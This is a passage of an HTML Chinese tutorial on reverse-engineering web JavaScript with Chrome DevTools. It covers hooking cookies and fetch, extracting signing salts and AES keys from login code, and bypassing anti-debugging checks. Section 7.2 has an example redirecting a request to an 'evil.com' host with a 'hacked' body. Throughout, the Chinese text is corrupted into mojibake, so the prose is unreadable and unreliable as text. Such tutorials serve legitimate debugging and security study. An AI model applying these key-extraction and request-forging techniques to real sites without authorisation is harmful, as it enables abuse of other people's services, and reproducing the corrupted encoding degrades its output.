  <td>è·³å‡ºå½“å‰å‡½æ•°</td>
</tr>
<tr>
  <td><strong>Ctrl+F8</strong></td>
  <td>Disable All Breakpoints</td>
  <td>ä¸´æ—¶ç¦ç”¨æ‰€æœ‰æ–­ç‚¹</td>
</tr>
</tbody>
</table>
<h4>é»‘ç›’è„šæœ¬ (Blackbox Script)</h4>
<p>å³é”®æ–‡ä»¶ â†’ &quot;Blackbox script&quot;</p>
<p><strong>ä½œç”¨</strong>: å•æ­¥è°ƒè¯•æ—¶è‡ªåŠ¨è·³è¿‡è¯¥æ–‡ä»¶ï¼ˆé€šå¸¸ç”¨äºè·³è¿‡ç¬¬ä¸‰æ–¹åº“ï¼‰</p>
<p><strong>ç¤ºä¾‹</strong>: è·³è¿‡ jQuery, Lodash ç­‰åº“æ–‡ä»¶</p>
<pre><code>Settings â†’ Blackboxing â†’ Add pattern
Pattern: jquery.*\.js
Pattern: lodash.*\.js
</code></pre>
<h4>Watch è¡¨è¾¾å¼ (Watch Expressions)</h4>
<p>åœ¨æ–­ç‚¹æš‚åœæ—¶ï¼Œå³ä¾§ Watch é¢æ¿å¯ä»¥ç›‘æ§è¡¨è¾¾å¼çš„å€¼</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// æ·»åŠ ä»¥ä¸‹è¡¨è¾¾å¼
params.sign;
JSON.stringify(params);
btoa(params.user_id);
</code></pre>
<p>æ¯æ¬¡æ–­ç‚¹åœä¸‹æ—¶ï¼Œè¿™äº›è¡¨è¾¾å¼éƒ½ä¼šè‡ªåŠ¨æ±‚å€¼å¹¶æ˜¾ç¤ºã€‚</p>
<hr />
<h2>3. å†…å­˜æ¼«æ¸¸ (Scope Sniffing)</h2>
<p>åœ¨æ–­ç‚¹åœä¸‹åï¼ŒConsole ä¸ä»…ä»…æ˜¯ç”¨æ¥æ‰“å° log çš„ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…¨åŠŸèƒ½çš„ REPL (Read-Eval-Print Loop)ã€‚</p>
<h3>3.1 æ£€æŸ¥ä½œç”¨åŸŸå˜é‡</h3>
<p><strong>Scope é¢æ¿æ˜¾ç¤º</strong>:</p>
<ul>
<li><strong>Local</strong>: å½“å‰å‡½æ•°çš„å±€éƒ¨å˜é‡</li>
<li><strong>Closure</strong>: é—­åŒ…å˜é‡ï¼ˆå¤–å±‚å‡½æ•°çš„å˜é‡ï¼‰</li>
<li><strong>Global</strong>: å…¨å±€å˜é‡ (<code>window</code>)</li>
</ul>
<p><strong>æŠ€å·§</strong>: åœ¨ Console ä¸­ç›´æ¥è®¿é—®</p>
<pre><code class="language-javascript">// åœ¨æ–­ç‚¹æš‚åœæ—¶ï¼ŒConsole çš„ä¸Šä¸‹æ–‡å°±æ˜¯å½“å‰å‡½æ•°
console.log(params); // æ‰“å°å±€éƒ¨å˜é‡ params
console.log(this); // æ‰“å° this å¯¹è±¡
</code></pre>
<h3>3.2 æ£€æŸ¥é—­åŒ…å˜é‡</h3>
<p><strong>é—®é¢˜</strong>: æŸäº›åŠ å¯†å‡½æ•°ä½¿ç”¨äº†é—­åŒ…å˜é‡ï¼ŒLocal Scope çœ‹ä¸åˆ°</p>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">function createEncryptor() {
  const secretKey = &quot;hardcoded_key_2024&quot;; // é—­åŒ…å˜é‡

  return function encrypt(data) {
    // ä½¿ç”¨ secretKeyï¼Œä½† Local Scope é‡Œçœ‹ä¸åˆ°
    return AES.encrypt(data, secretKey);
  };
}

const encrypt = createEncryptor();
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<ol>
<li>æŸ¥çœ‹ Scope é¢æ¿ â†’ <strong>Closure</strong> éƒ¨åˆ†</li>
<li>æˆ–åœ¨ Console é‡Œç›´æ¥è¾“å…¥å˜é‡åè¯•è¯•</li>
</ol>
<h3>3.3 å¯¼å‡ºå¤§å¯¹è±¡/æ•°ç»„</h3>
<p><strong>åœºæ™¯</strong>: æ··æ·†ä»£ç é¢„å…ˆç”Ÿæˆäº†ä¸€ä¸ªå·¨å¤§çš„å­—ç¬¦ä¸²æ•°ç»„ï¼ˆå¤§è¡¨ï¼‰</p>
<p><strong>æ–¹æ³• 1: copy() å‡½æ•°</strong></p>
<pre><code class="language-javascript">// åœ¨ Console ä¸­æ‰§è¡Œ
copy(bigArray); // è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªè´´æ¿
</code></pre>
<p><strong>æ–¹æ³• 2: ä¸‹è½½ä¸ºæ–‡ä»¶</strong></p>
<pre><code class="language-javascript">// å¯¼å‡ºä¸º JSON æ–‡ä»¶
const json = JSON.stringify(bigArray, null, 2);
const blob = new Blob([json], { type: &quot;application/json&quot; });
const url = URL.createObjectURL(blob);
const a = document.createElement(&quot;a&quot;);
a.href = url;
a.download = &quot;bigArray.json&quot;;
a.click();
</code></pre>
<h3>3.4 ä¿®æ”¹è¿è¡Œæ—¶å˜é‡</h3>
<p>åœ¨æ–­ç‚¹æš‚åœæ—¶ï¼Œå¯ä»¥åœ¨ Console ä¸­ç›´æ¥ä¿®æ”¹å˜é‡ï¼š</p>
<pre><code class="language-javascript">// ä¿®æ”¹å‚æ•°æµ‹è¯•ä¸åŒæƒ…å†µ
params.timestamp = 1234567890;
params.sign = &quot;test_sign&quot;;

// ä¿®æ”¹å¯¹è±¡åŸå‹é“¾
Object.prototype.myDebug = true;
</code></pre>
<hr />
<h2>4. æ¢é’ˆæŠ€æœ¯ (Probing)</h2>
<p>å¦‚æœæ‰¾ä¸åˆ°æŸä¸ªå‡½æ•°åœ¨å“ªè¢«è°ƒç”¨ï¼Œå¯ä»¥&quot;æŠ•çŸ³é—®è·¯&quot;ã€‚</p>
<h3>4.1 æ±¡ç‚¹è¿½è¸ª (Property Access Interception)</h3>
<p><strong>åœºæ™¯</strong>: æ€€ç–‘æŸä¸ªå¯¹è±¡çš„å±æ€§ <code>x</code> ä¼šè¢«åŠ å¯†å‡½æ•°è¯»å–</p>
<p><strong>æ–¹æ³•</strong>: ä½¿ç”¨ <code>Object.defineProperty</code> åŠ«æŒå±æ€§è®¿é—®</p>
<pre><code class="language-javascript">const obj = { x: &quot;original_value&quot; };

Object.defineProperty(obj, &quot;x&quot;, {
  get: function () {
    console.trace(&quot;è¯»å–äº† obj.x&quot;); // æ‰“å°è°ƒç”¨æ ˆ
    debugger; // è‡ªåŠ¨æ–­ç‚¹
    return &quot;original_value&quot;;
  },
  set: function (value) {
    console.trace(&quot;ä¿®æ”¹äº† obj.x ä¸º&quot;, value);
    debugger;
  },
});
</code></pre>
<p><strong>å®æˆ˜æ¡ˆä¾‹</strong>: è¿½è¸ª Cookie è¯»å–</p>
<pre><code class="language-javascript">// åŠ«æŒ document.cookie
let _cookie = document.cookie;
Object.defineProperty(document, &quot;cookie&quot;, {
  get: function () {
    console.trace(&quot;è¯»å–äº† cookie&quot;);
    debugger;
    return _cookie;
  },
  set: function (value) {
    console.trace(&quot;è®¾ç½®äº† cookie:&quot;, value);
    _cookie = value;
  },
});
</code></pre>
<h3>4.2 å‡½æ•°åŠ«æŒ (Function Hooking)</h3>
<p><strong>åœºæ™¯</strong>: è¿½è¸ªæŸä¸ªå‡½æ•°çš„è°ƒç”¨</p>
<p><strong>æ–¹æ³• 1: åŠ«æŒå…¨å±€å‡½æ•°</strong></p>
<pre><code class="language-javascript">const _fetch = window.fetch;
window.fetch = function (...args) {
  console.log(&quot;[Fetch]&quot;, args[0]); // æ‰“å° URL
  debugger; // å‘èµ· fetch è¯·æ±‚å‰æ–­ç‚¹
  return _fetch.apply(this, args);
};
</code></pre>
<p><strong>æ–¹æ³• 2: åŠ«æŒåŸå‹æ–¹æ³•</strong></p>
<pre><code class="language-javascript">const _stringify = JSON.stringify;
JSON.stringify = function (obj) {
  console.log(&quot;[JSON.stringify]&quot;, obj);
  debugger;
  return _stringify.apply(this, arguments);
};
</code></pre>
<p><strong>æ–¹æ³• 3: Proxy ä»£ç†</strong></p>
<pre><code class="language-javascript">const handler = {
  apply: function (target, thisArg, args) {
    console.log(&quot;[è°ƒç”¨]&quot;, target.name, args);
    debugger;
    return target.apply(thisArg, args);
  },
};

// åŠ«æŒåŠ å¯†å‡½æ•°
const originalEncrypt = window.encrypt;
window.encrypt = new Proxy(originalEncrypt, handler);
</code></pre>
<h3>4.3 å¼‚å¸¸æ–­ç‚¹ (Exception Breakpoint)</h3>
<p><strong>æ–¹æ³•</strong>: Sources é¢æ¿ â†’ å‹¾é€‰ &quot;Pause on exceptions&quot;</p>
<p><strong>åº”ç”¨åœºæ™¯</strong>:</p>
<ul>
<li>ä»£ç æŠ›å‡ºé”™è¯¯æ—¶è‡ªåŠ¨æš‚åœ</li>
<li>è¿½è¸ª <code>try-catch</code> ä¸­æ•è·çš„å¼‚å¸¸</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">try {
  // æŸä¸ªä¼šæŠ›å¼‚å¸¸çš„åŠ å¯†å‡½æ•°
  const encrypted = riskyEncrypt(data);
} catch (e) {
  // å¦‚æœå‹¾é€‰äº† &quot;Pause on caught exceptions&quot;ï¼Œä¼šåœ¨è¿™é‡Œæš‚åœ
  console.error(e);
}
</code></pre>
<hr />
<h2>5. å¼‚æ­¥è°ƒè¯• (Async Debugging)</h2>
<h3>5.1 Promise è°ƒè¯•</h3>
<p><strong>é—®é¢˜</strong>: Promise é“¾ä¸­æŸä¸ªæ­¥éª¤å‡ºé”™ï¼Œéš¾ä»¥å®šä½</p>
<p><strong>è§£å†³æ–¹æ¡ˆ 1</strong>: å¯ç”¨ Async Stack Traces</p>
<pre><code>DevTools Settings â†’ Enable async stack traces
</code></pre>
<p><strong>æ•ˆæœ</strong>: è°ƒç”¨æ ˆä¼šæ˜¾ç¤ºå®Œæ•´çš„ Promise é“¾</p>
<pre><code>Call Stack:
then (api.js:123)  â† å½“å‰ Promise
  â†‘ (async)
fetchData (main.js:45)  â† å‘èµ· Promise çš„ä½ç½®
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ 2</strong>: åœ¨ Promise ä¸­æ‰‹åŠ¨æ–­ç‚¹</p>
<pre><code class="language-javascript">fetch(&quot;/api/data&quot;)
  .then((response) =&gt; {
    debugger; // æ–­ç‚¹
    return response.json();
  })
  .then((data) =&gt; {
    debugger; // æ–­ç‚¹
    console.log(data);
  });
</code></pre>
<h3>5.2 async/await è°ƒè¯•</h3>
<p>ä½¿ç”¨ <code>async/await</code> æ¯” Promise é“¾æ›´å®¹æ˜“è°ƒè¯•ï¼š</p>
<pre><code class="language-javascript">async function fetchData() {
  const response = await fetch(&quot;/api/data&quot;); // æ–­ç‚¹
  const json = await response.json(); // æ–­ç‚¹
  console.log(json); // æ–­ç‚¹
}
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>: å¯ä»¥åƒåŒæ­¥ä»£ç ä¸€æ ·å•æ­¥è°ƒè¯• (F10)</p>
<h3>5.3 setTimeout/setInterval è°ƒè¯•</h3>
<p><strong>æ–¹æ³• 1</strong>: Event Listener Breakpoint</p>
<pre><code>Sources â†’ Event Listener Breakpoints â†’ Timer â†’ setInterval fired
</code></pre>
<p><strong>æ–¹æ³• 2</strong>: åŠ«æŒå®šæ—¶å™¨**</p>
<pre><code class="language-javascript">const _setTimeout = window.setTimeout;
window.setTimeout = function (callback, delay) {
  console.log(`[setTimeout] ${delay}ms`, callback.toString());
  debugger;
  return _setTimeout.apply(this, arguments);
};
</code></pre>
<hr />
<h2>6. æ€§èƒ½åˆ†æ (Performance Profiling)</h2>
<h3>6.1 CPU æ€§èƒ½åˆ†æ</h3>
<p><strong>åœºæ™¯</strong>: ä»£ç è¿è¡Œå¾ˆæ…¢ï¼Œæ€€ç–‘æœ‰æ€§èƒ½ç“¶é¢ˆæˆ–æ•…æ„çš„å»¶è¿Ÿ</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>Performance é¢æ¿ â†’ ç‚¹å‡» Record</li>
<li>æ‰§è¡Œç›®æ ‡æ“ä½œï¼ˆå¦‚ç‚¹å‡»æŒ‰é’®ï¼‰</li>
<li>åœæ­¢å½•åˆ¶</li>
<li>æŸ¥çœ‹ <strong>Flame Chart</strong>ï¼ˆç«ç„°å›¾ï¼‰</li>
</ol>
<p><strong>åˆ†ææŠ€å·§</strong>:</p>
<ul>
<li><strong>å®½åº¦</strong> = æ‰§è¡Œæ—¶é—´ï¼ˆè¶Šå®½è¶Šæ…¢ï¼‰</li>
<li><strong>é¢œè‰²</strong>:<ul>
<li>é»„è‰² = JavaScript æ‰§è¡Œ</li>
<li>ç´«è‰² = æ¸²æŸ“/å¸ƒå±€</li>
<li>ç»¿è‰² = ç»˜åˆ¶</li>
</ul>
</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>: å‘ç°æŸä¸ªå‡½æ•° <code>slowHash()</code> å ç”¨äº† 90% çš„ CPU æ—¶é—´ â†’ è¿™å°±æ˜¯åŠ å¯†/æ··æ·†çš„æ ¸å¿ƒé€»è¾‘</p>
<h3>6.2 å†…å­˜åˆ†æ</h3>
<p><strong>åœºæ™¯</strong>: æ€€ç–‘ä»£ç ä¸­è—æœ‰è§£å¯†åçš„ Key æˆ–æ˜æ–‡æ•°æ®</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>Memory é¢æ¿ â†’ Take Heap Snapshot</li>
<li>åœ¨æœç´¢æ¡†è¾“å…¥å…³é”®å­—ï¼ˆå¦‚ <code>secret</code>, <code>key</code>, <code>password</code>ï¼‰</li>
<li>æŸ¥æ‰¾å­—ç¬¦ä¸²å¯¹è±¡</li>
</ol>
<p><strong>æŠ€å·§</strong>: å¯¹æ¯”ä¸¤ä¸ªå¿«ç…§</p>
<ol>
<li>æ‹ç¬¬ä¸€ä¸ªå¿«ç…§</li>
<li>æ‰§è¡Œç›®æ ‡æ“ä½œï¼ˆå¦‚ç™»å½•ï¼‰</li>
<li>æ‹ç¬¬äºŒä¸ªå¿«ç…§</li>
<li>é€‰æ‹© Comparison æ¨¡å¼ â†’ æŸ¥çœ‹æ–°å¢çš„å¯¹è±¡</li>
</ol>
<hr />
<h2>7. ç½‘ç»œè¯·æ±‚åˆ†æ</h2>
<h3>7.1 XHR/Fetch æ–­ç‚¹</h3>
<p>åœ¨ Sources é¢æ¿è®¾ç½® URL è¿‡æ»¤å™¨ï¼š</p>
<pre><code>XHR/fetch Breakpoints:
- /api/login
- /api/data
</code></pre>
<p>å½“å‘é€åŒ¹é…çš„è¯·æ±‚æ—¶è‡ªåŠ¨æ–­ç‚¹ï¼Œæ­¤æ—¶å¯ä»¥ï¼š</p>
<ul>
<li>æŸ¥çœ‹ Call Stackï¼ˆè°å‘èµ·çš„è¯·æ±‚ï¼‰</li>
<li>æŸ¥çœ‹ Local å˜é‡ï¼ˆè¯·æ±‚å‚æ•°ï¼‰</li>
<li>ä¿®æ”¹å‚æ•°åç»§ç»­æ‰§è¡Œ</li>
</ul>
<h3>7.2 ä¿®æ”¹è¯·æ±‚å‚æ•°</h3>
<p><strong>æ–¹æ³• 1: åœ¨æ–­ç‚¹å¤„ä¿®æ”¹</strong></p>
<pre><code class="language-javascript">// åœ¨ fetch() æ–­ç‚¹å¤„
url = &quot;https://evil.com/api&quot;; // ä¿®æ”¹ URL
body = JSON.stringify({ hacked: true }); // ä¿®æ”¹ Body
</code></pre>
<p><strong>æ–¹æ³• 2: ä½¿ç”¨ Local Overrides</strong></p>
<ol>
<li>Network â†’ å³é”®è¯·æ±‚ â†’ &quot;Override content&quot;</li>
<li>ä¿®æ”¹å“åº”å†…å®¹</li>
<li>åˆ·æ–°é¡µé¢ â†’ ä½¿ç”¨ä¿®æ”¹åçš„å“åº”</li>
</ol>
<hr />
<h2>8. å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ 1ï¼šè¿½è¸ªç­¾åå‡½æ•°çš„ Salt</h3>
<p><strong>ç›®æ ‡</strong>: æŸ API çš„ç­¾ååŒ…å«ä¸€ä¸ªæœªçŸ¥çš„ Salt</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>Network é¢æ¿æ‰¾åˆ°è¯·æ±‚ï¼Œå‘ç°å‚æ•° <code>sign=e8f2d3c1...</code></li>
<li>æœç´¢ <code>sign</code> å…³é”®å­—ï¼Œæ‰¾åˆ° <code>generateSign()</code> å‡½æ•°</li>
<li>åœ¨è¯¥å‡½æ•°å…¥å£æ‰“æ–­ç‚¹</li>
<li>è§¦å‘è¯·æ±‚ï¼ˆå¦‚ç‚¹å‡»æŒ‰é’®ï¼‰â†’ æ–­ç‚¹æš‚åœ</li>
<li>æŸ¥çœ‹ Call Stack å’Œ Local Scope</li>
<li>å‘ç°å±€éƒ¨å˜é‡ <code>salt = &quot;my_secret_2024&quot;</code></li>
<li>åœ¨ Console ä¸­éªŒè¯ï¼š<pre><code class="language-javascript">md5(&quot;user_id=123&amp;timestamp=1638360000&amp;salt=my_secret_2024&quot;);
// ç»“æœä¸ sign åŒ¹é… âœ…
</code></pre>
</li>
</ol>
<h3>æ¡ˆä¾‹ 2ï¼šå®šä½ AES å¯†é’¥</h3>
<p><strong>ç›®æ ‡</strong>: æŸç™»å½•æ¥å£çš„å¯†ç æ˜¯ AES åŠ å¯†çš„ï¼Œå¯†é’¥æœªçŸ¥</p>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li>æœç´¢ <code>AES.encrypt</code> å…³é”®å­—</li>
<li>æ‰¾åˆ°åŠ å¯†å‡½æ•°ï¼š<pre><code class="language-javascript">function encryptPassword(password) {
  return CryptoJS.AES.encrypt(password, key, { iv: iv }).toString();
}
</code></pre>
</li>
<li>åœ¨è¯¥å‡½æ•°æ‰“æ–­ç‚¹</li>
<li>è§¦å‘ç™»å½•æ“ä½œ â†’ æ–­ç‚¹æš‚åœ</li>
<li>æŸ¥çœ‹ Scope é¢æ¿ â†’ Closure éƒ¨åˆ†</li>
<li>å‘ç° <code>key = &quot;1234567890abcdef&quot;</code>, <code>iv = &quot;abcdef1234567890&quot;</code></li>
<li>åœ¨ Console ä¸­éªŒè¯ï¼š<pre><code class="language-javascript">CryptoJS.AES.encrypt(&quot;MyPassword&quot;, key, { iv: iv }).toString();
// ç»“æœä¸å®é™…åŠ å¯†çš„å¯†ç åŒ¹é… âœ…
</code></pre>
</li>
</ol>
<h3>æ¡ˆä¾‹ 3ï¼šè¿½è¸ªåŠ¨æ€ç”Ÿæˆçš„å‚æ•°</h3>
<p><strong>ç›®æ ‡</strong>: æŸè¯·æ±‚çš„ <code>device_id</code> å‚æ•°æ¯æ¬¡éƒ½ä¸åŒï¼Œä¸çŸ¥é“å¦‚ä½•ç”Ÿæˆ</p>
<p><strong>æ–¹æ³• 1: XHR æ–­ç‚¹</strong></p>
<ol>
<li>è®¾ç½® XHR æ–­ç‚¹ï¼ˆURL: <code>/api/data</code>ï¼‰</li>
<li>è§¦å‘è¯·æ±‚ â†’ è‡ªåŠ¨æ–­ç‚¹</li>
<li>æŸ¥çœ‹ Call Stack:<pre><code>send (XMLHttpRequest)
  â†‘
sendRequest (api.js:567)  â† æŸ¥çœ‹æ­¤å¤„ä»£ç 
  â†‘
onClick (main.js:89)
</code></pre>
</li>
<li>è·³è½¬åˆ° <code>api.js:567</code>ï¼Œå‘ç°ï¼š<pre><code class="language-javascript">const device_id = getDeviceId(); // è°ƒç”¨äº†å‡½æ•°
</code></pre>
</li>
<li>ç»§ç»­è¿½è¸ª <code>getDeviceId()</code> å‡½æ•°</li>
</ol>
<p><strong>æ–¹æ³• 2: å±æ€§æ‹¦æˆª</strong></p>
<pre><code class="language-javascript">// åœ¨ Console ä¸­æ‰§è¡Œ
const params = {};
Object.defineProperty(params, &quot;device_id&quot;, {
  set: function (value) {
    console.trace(&quot;è®¾ç½® device_id:&quot;, value);
    debugger;
    this._device_id = value;
  },
  get: function () {
    return this._device_id;
  },
});

// å½“ä»£ç æ‰§è¡Œ params.device_id = xxx æ—¶ï¼Œè‡ªåŠ¨æ–­ç‚¹
</code></pre>
<h3>æ¡ˆä¾‹ 4ï¼šåè°ƒè¯•ç»•è¿‡</h3>
<p><strong>ç°è±¡</strong>: æ‰“å¼€ DevTools åé¡µé¢ä¸€ç‰‡ç©ºç™½æˆ–æŠ¥é”™</p>
<p><strong>å¸¸è§åè°ƒè¯•æ‰‹æ®µ</strong>:</p>
<h4>æ£€æµ‹ DevTools æ‰“å¼€</h4>
<pre><code class="language-javascript">// æ£€æµ‹ console
const devtools = /./;
devtools.toString = function () {
  this.opened = true;
};
console.log(&quot;%c&quot;, devtools);
if (devtools.opened) {
  alert(&quot;è¯·å…³é—­å¼€å‘è€…å·¥å…·&quot;);
  debugger; // æ— é™ debugger å¾ªç¯
}
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<ol>
<li>ç¦ç”¨æ‰€æœ‰æ–­ç‚¹ï¼ˆCtrl+F8ï¼‰</li>
<li>æˆ–åœ¨ Console ä¸­æ‰§è¡Œï¼š<pre><code class="language-javascript">devtools.toString = function () {
  return &quot;&quot;;
};
</code></pre>
</li>
</ol>
<h4>æ£€æµ‹é¡µé¢å¤§å°å˜åŒ–</h4>
<pre><code class="language-javascript">window.onresize = function () {
  if (window.outerWidth - window.innerWidth &gt; 200) {
    alert(&quot;æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·&quot;);
    location.href = &quot;about:blank&quot;; // è·³è½¬ç©ºç™½é¡µ
  }
};
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>: åœ¨ç‹¬ç«‹çª—å£æ‰“å¼€ DevToolsï¼ˆUndock into separate windowï¼‰</p>
<h4>æ— é™ debugger</h4>
<pre><code class="language-javascript">setInterval(function () {
  debugger;
}, 100);
</code></pre>
<p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>
<ol>
<li>ç¦ç”¨æ‰€æœ‰æ–­ç‚¹ï¼ˆCtrl+F8ï¼‰</li>
<li>æˆ–å³é”®ä»£ç  â†’ &quot;Never pause here&quot;</li>
</ol>
<hr />
<h2>9. è°ƒè¯•æŠ€å·§æ€»ç»“</h2>
<h3>9.1 å¿«é€Ÿå®šä½æŠ€å·§</h3>
<table>
<thead>
<tr>
  <th>åœºæ™¯</th>
  <th>æ–¹æ³•</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ‰¾ä¸åˆ°ç­¾åå‡½æ•°</strong></td>
  <td>æœç´¢ <code>sign</code>ã€<code>signature</code>ã€<code>md5</code>ã€<code>sha</code></td>
</tr>
<tr>
  <td><strong>æ‰¾ä¸åˆ°åŠ å¯†å‡½æ•°</strong></td>
  <td>æœç´¢ <code>encrypt</code>ã€<code>AES</code>ã€<code>RSA</code>ã€<code>CryptoJS</code></td>
</tr>
<tr>
  <td><strong>æ‰¾ä¸åˆ°è¯·æ±‚å‘èµ·ç‚¹</strong></td>
  <td>Network â†’ Initiator â†’ ç‚¹å‡»é“¾æ¥</td>
</tr>
<tr>
  <td><strong>æ‰¾ä¸åˆ°äº‹ä»¶å¤„ç†å‡½æ•°</strong></td>
  <td>Elements â†’ Event Listeners</td>
</tr>
<tr>
  <td><strong>æ‰¾ä¸åˆ°å®šæ—¶å™¨å›è°ƒ</strong></td>
  <td>Sources â†’ Event Listener Breakpoints â†’ Timer</td>
</tr>
</tbody>
</table>
<h3>9.2 å¸¸è§é”™è¯¯</h3>
<table>
<thead>
<tr>
  <th>é”™è¯¯</th>
  <th>åŸå› </th>
  <th>è§£å†³æ–¹æ¡ˆ</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>å˜é‡æ˜¾ç¤º <code>undefined</code></strong></td>
  <td>ä½œç”¨åŸŸä¸å¯¹</td>
  <td>æ£€æŸ¥ Scope é¢æ¿ï¼Œå¯èƒ½åœ¨ Closure ä¸­</td>
</tr>
<tr>
  <td><strong>æ–­ç‚¹ä¸ç”Ÿæ•ˆ</strong></td>
  <td>ä»£ç å·²ä¼˜åŒ–/å†…è”</td>
  <td>ä½¿ç”¨ Logpoint æˆ–ç¦ç”¨ç¼“å­˜</td>
</tr>
<tr>
  <td><strong>è°ƒç”¨æ ˆçœ‹ä¸åˆ°æºç </strong></td>
  <td>Source Map ç¼ºå¤±</td>
  <td>å¯»æ‰¾ <code>.map</code> æ–‡ä»¶æˆ–åˆ†æç¼–è¯‘åä»£ç </td>
</tr>
<tr>
  <td><strong>å¼‚æ­¥ä»£ç æ–­ä¸ä½</strong></td>
  <td>Async Stack Traces æœªå¼€å¯</td>
  <td>Settings â†’ Enable async stack traces</td>
</tr>
</tbody>
</table>
<h3>9.3 æ•ˆç‡æå‡æŠ€å·§</h3>
<pre><code class="language-javascript">// 1. å¿«é€Ÿæ‰“å°è°ƒç”¨æ ˆ
console.trace();

// 2. å¿«é€Ÿæ‰“å°å¯¹è±¡ï¼ˆç¾åŒ–ï¼‰
console.table(params);
console.dir(obj, { depth: null });

// 3. æ€§èƒ½æµ‹è¯•
console.time(&quot;åŠ å¯†è€—æ—¶&quot;);
encrypt(data);
console.timeEnd(&quot;åŠ å¯†è€—æ—¶&quot;); // è¾“å‡ºï¼šåŠ å¯†è€—æ—¶: 123.45ms

// 4. åˆ†ç»„æ—¥å¿—
console.group(&quot;ç­¾åè®¡ç®—è¿‡ç¨‹&quot;);
console.log(&quot;æ­¥éª¤ 1: å‚æ•°æ’åº&quot;, sorted);
console.log(&quot;æ­¥éª¤ 2: æ‹¼æ¥å­—ç¬¦ä¸²&quot;, joined);
console.log(&quot;æ­¥éª¤ 3: MD5 åŠ å¯†&quot;, hashed);
console.groupEnd();

// 5. æ–­è¨€
console.assert(params.sign === expected, &quot;ç­¾åä¸åŒ¹é…ï¼&quot;);
</code></pre>
<hr />
<h2>10. è¿›é˜¶å·¥å…·</h2>
<h3>10.1 Chrome DevTools Protocol (CDP)</h3>
<p>é€šè¿‡ CDP å¯ä»¥ç¼–ç¨‹æ§åˆ¶ Chromeï¼Œå®ç°è‡ªåŠ¨åŒ–è°ƒè¯•ã€‚</p>
<p><strong>ç¤ºä¾‹</strong>: ä½¿ç”¨ Python è‡ªåŠ¨æ‰“æ–­ç‚¹</p>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.chrome.options import Options

options = Options()
options.add_experimental_option(&quot;debuggerAddress&quot;, &quot;127.0.0.1:9222&quot;)

driver = webdriver.Chrome(options=options)
driver.execute_cdp_cmd(&quot;Debugger.enable&quot;, {})
driver.execute_cdp_cmd(&quot;Debugger.setBreakpointByUrl&quot;, {
    &quot;lineNumber&quot;: 123,
    &quot;url&quot;: &quot;https://example.com/utils.js&quot;
})
</code></pre>
<h3>10.2 Puppeteer è°ƒè¯•æ¨¡å¼</h3>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer&quot;);

(async () =&gt; {
  const browser = await puppeteer.launch({
    headless: false,
    devtools: true, // è‡ªåŠ¨æ‰“å¼€ DevTools
  });

  const page = await browser.newPage();

  // åœ¨æ§åˆ¶å°æ‰§è¡Œä»£ç 
  await page.evaluateOnNewDocument(() =&gt; {
    window.addEventListener(&quot;load&quot;, () =&gt; {
      debugger; // é¡µé¢åŠ è½½å®Œæˆåè‡ªåŠ¨æ–­ç‚¹
    });
  });

  await page.goto(&quot;https://example.com&quot;);
})();
</code></pre>
<h3>10.3 Frida Hook (ç§»åŠ¨ç«¯/æ¡Œé¢åº”ç”¨)</h3>
<p>å¯¹äºéæµè§ˆå™¨ç¯å¢ƒï¼ˆå¦‚ Electronã€React Nativeï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ Fridaã€‚</p>
<pre><code class="language-javascript">// Frida è„šæœ¬
Interceptor.attach(Module.findExportByName(null, &quot;encrypt&quot;), {
  onEnter: function (args) {
    console.log(&quot;[encrypt] å‚æ•°:&quot;, Memory.readUtf8String(args[0]));
  },
  onLeave: function (retval) {
    console.log(&quot;[encrypt] è¿”å›å€¼:&quot;, Memory.readUtf8String(retval));
  },
});
</code></pre>
<hr />
<h2>æ€»ç»“</h2>
<p>åŠ¨æ€åˆ†æçš„ç²¾é«“åœ¨äºï¼š</p>
<ol>
<li>âœ… <strong>è°ƒç”¨æ ˆè¿½è¸ª</strong>: ä» Initiator æˆ– Call Stack æ‰¾åˆ°ä»£ç å…¥å£</li>
<li>âœ… <strong>æ–­ç‚¹æŠ€å·§</strong>: æ¡ä»¶æ–­ç‚¹ã€Logpointã€XHR æ–­ç‚¹ã€äº‹ä»¶æ–­ç‚¹</li>
<li>âœ… <strong>ä½œç”¨åŸŸæ£€æŸ¥</strong>: Localã€Closureã€Global ä¸‰å±‚ä½œç”¨åŸŸ</li>
<li>âœ… <strong>æ¢é’ˆæŠ€æœ¯</strong>: å±æ€§æ‹¦æˆªã€å‡½æ•°åŠ«æŒã€Proxy ä»£ç†</li>
<li>âœ… <strong>å¼‚æ­¥è°ƒè¯•</strong>: Async Stack Tracesã€Promise é“¾è¿½è¸ª</li>
<li>âœ… <strong>æ€§èƒ½åˆ†æ</strong>: CPU Profileã€Memory Snapshot</li>
<li>âœ… <strong>åè°ƒè¯•ç»•è¿‡</strong>: ç¦ç”¨æ–­ç‚¹ã€ä¿®æ”¹æ£€æµ‹ä»£ç </li>
</ol>
<p><strong>è®°ä½</strong>: ä¸è¦è¯•å›¾ç†è§£æ¯ä¸€è¡Œæ··æ·†ä»£ç ï¼Œè€Œæ˜¯<strong>è§‚å¯Ÿæ•°æ®æµ</strong> â€”â€” æ•°æ®ä»å“ªé‡Œæ¥ã€ç»è¿‡äº†ä»€ä¹ˆå¤„ç†ã€æœ€åå˜æˆäº†ä»€ä¹ˆã€‚</p>
<hr />
